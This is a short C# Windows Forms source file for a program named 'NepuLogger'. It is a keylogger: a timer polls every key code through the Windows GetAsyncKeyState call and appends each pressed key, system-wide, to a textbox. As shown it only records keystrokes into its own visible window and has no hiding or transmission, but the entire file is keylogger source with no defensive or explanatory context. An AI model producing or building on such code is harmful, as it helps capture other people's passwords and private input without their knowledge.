using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NepuLogger
{
    
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            for (int i = 0; i < 255; i++)
            {
                int state = GetAsyncKeyState(i);
                if (state == 1 || state == -32767)
                {
                    txtLog.Text += (Keys)i;
                }
            }
        }
    }
}
